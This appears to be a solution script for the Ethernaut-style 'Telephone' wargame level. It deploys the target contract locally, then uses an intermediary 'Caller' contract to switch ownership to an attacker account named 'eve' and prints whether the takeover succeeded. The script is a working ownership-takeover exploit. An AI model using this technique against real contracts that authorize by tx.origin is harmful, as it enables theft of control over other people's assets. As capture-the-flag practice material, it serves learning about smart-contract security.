const { getCreate2Address } = require("@ethersproject/address");
const hre = require("hardhat");

async function main() {

    const Telephone = await hre.ethers.getContractFactory("Telephone");
    const telephone = await Telephone.deploy();

    await telephone.deployed();

    const [alice, eve] = (await hre.ethers.getSigners()).map(s => s.address);

    const oldOwner = await telephone.owner();

    console.log("old Owner " + oldOwner);

    const Caller = await hre.ethers.getContractFactory("Caller");
    const caller = await Caller.deploy(telephone.address);

    await caller.callChangeOwner(eve);

    const newOwner = await telephone.owner();

    console.log("new Owner " + newOwner);
    console.log("Successfully claimed ownership ",eve===newOwner);


}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
